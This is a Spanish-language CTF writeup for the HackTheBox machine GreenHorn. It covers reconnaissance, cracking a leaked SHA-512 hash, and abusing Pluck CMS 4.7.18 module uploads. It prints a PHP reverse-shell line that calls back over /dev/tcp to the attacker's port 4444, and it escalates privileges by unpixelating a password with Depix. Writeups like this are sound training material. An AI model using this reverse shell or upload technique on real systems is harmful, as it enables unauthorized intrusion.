---
title: Writeup de la máquina GreenHorn
date: 2024-08-03
categories: [WRITEUPS, HackTheBox]
tags: [pluck, depix]  # TAG names should always be lowercase
---

![picture](/assets/images/hackthebox/greenhorn1.png)

En este ***Writeup*** se engloban las siguientes fases:
- **Reconocimiento**
- **Explotación**
- **Escalada de privilegios**

---

## **RECONOCIMIENTO**

Lo primero que realizaremos, será un escaneo con **NMAP**, para comprobar los puertos abiertos de la máquina, y conocer los servicios que corren por ellos.

```bash
nmap -p- --open -T5 10.10.11.25 -n -Pn -v
```

![picture](/assets/images/hackthebox/greenhorn2.png)

Añadimos el dominio **greenhorn.htb** junto con la *IP* al archivo **/etc/hosts**, esto se realiza para que resuelva el nombre del dominio.

![picture](/assets/images/hackthebox/greenhorn3.png)

Al no encontrar ningún puerto interesante por el que se pueda intentar algún tipo de explotación, vamos al navegador a ver de que se trata la página web tanto con el puerto **80**, como con el **3000**.

1. Puerto 80
    - Tras revisar la página web y su código, en busca de algún tipo de información, no he encontrado nada.

    ![picture](/assets/images/hackthebox/green4.png)

    - Haciendo un poco de **Fuzzing** manual, encontramos la ruta *http://greenhorn.htb/login.php*, en la que hay un panel de login de **Pluck** (gestor de contenidos CMS), con versión **4.7.18**, probando contraseñas comunes no he obtenido resultado.

    ![picture](/assets/images/hackthebox/green5.png)

2. Puerto 3000
    - En este puerto encontramos una web de **Gitea**, que es un paquete de software de código abierto para alojar el control de versiones utilizando **Git**. Navegando en esta web encontramos un repositorio llamado **GreenAdmin**.

    ![picture](/assets/images/hackthebox/green6.png)

    - Viendo el contenido de las carpetas del repositorio, nos encontramos con una contraseña cifrada en ***/data/settings***.

    ![picture](/assets/images/hackthebox/green7.png)

    ---

## **EXPLOTACIÓN**

A continuación, vamos a intentar crackear la contraseña con ***John The Ripper*** en nuestra máquina local.

- Identificamos el tipo de cifrado hash con la herramienta **hash-identifier**, y vemos que el hash es del tipo "*SHA-512*".

    ![picture](/assets/images/hackthebox/green88.png)

- Se procede a crackear la contraseña cifrada, en busca de la contraseña en texto claro.

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash.txt
    ```

    ![picture](/assets/images/hackthebox/green9.png)

Una vez encontrada la contraseña, se va a probar a entrar el el panel de **PLUCK**, y obtengo acceso.

![picture](/assets/images/hackthebox/green10.png)

Buscando en internet encontramos que la versión de **PLUCK** es vulnerable, en la parte de instalar módulos, podemos subir un archivo **.php**, el cual nos lo va a ejecutar.
La idea es subir una una **Reverse Shell** sencilla, pero hay un inconveniente, este CMS solo deja subir archivos **.zip**, con lo cual tendremos que modificar el archivo y crear un ***.zip***.

![picture](/assets/images/hackthebox/green11.png)

Nos ponemos en escucha con un **Listener** por el puerto **4444**, para que cuando subamos el archivo y nos ejecute la **Reverse Shell**, nos envíe una **Shell interactiva** a nuestra máquina local.

- Listener

    ```bash
    nc -nlvp 4444
    ```
- Reverse Shell (contenido)

    ```php
    exec("/bin/bash -c 'bash -i > /dev/tcp/Nuestra Ip/4444 0>&1'");
    ```

Y subimos el archivo **.zip**.

![picture](/assets/images/hackthebox/green12.png)

Una vez subido el archivo, nos envía la **Shell interactiva**, y estamos dentro de la máquina con el ussuario **www-data**.

![picture](/assets/images/hackthebox/green13.png)

---

## **ESCALADA DE PRIVILEGIOS**

En el directorio **/home** encontramos un usuario llamado **junior**, probamos a conectarnos con la contraseña encontrada antes, y obtenemos acceso.

![picture](/assets/images/hackthebox/green14.png)

En el directorio personal encontramos la primera **flag**.

![picture](/assets/images/hackthebox/green15.png)

En el directorio personal, también encontramos un **pdf**, el cual nos lo vamos a traer a la máquina local para poder comprobar el contenido, para ello montamos un **servidor http** con **Python3** por el puerto **1234**, y nos lo descargamos con **wget** desde la máquina local.

```bash
python3 -m http.server 1234
```

![picture](/assets/images/hackthebox/green16.png)


Vemos que es una imagen con este texto, y una contraseña *pixelizada* e *ilegible*.

![picture](/assets/images/hackthebox/green17.png){: w="600" h="300" }

Para poder leer el contenido de la contraseña, vamos a utilizar una herramienta llamada ***DEPIX***, la cual podemos encontrar en [GitHub](https://github.com/spipm/Depix).

Antes convertimos el *pdf* al formato *ppm* con **pdfimages**.

![picture](/assets/images/hackthebox/green18.png)

Seguimos los pasos como lo indican en el repositorio de *GitHub*.

![picture](/assets/images/hackthebox/green19.png)

Y nos crea un archivo con la contraseña legible.

![picture](/assets/images/hackthebox/green20.png)

Probamos a migrar al usuario **privilegiado** **root**, obtenemos acceso, y en su directorio personal tenemos la segunda **flag**.

![picture](/assets/images/hackthebox/green21.png)

![picture](/assets/images/hackthebox/green22.png)


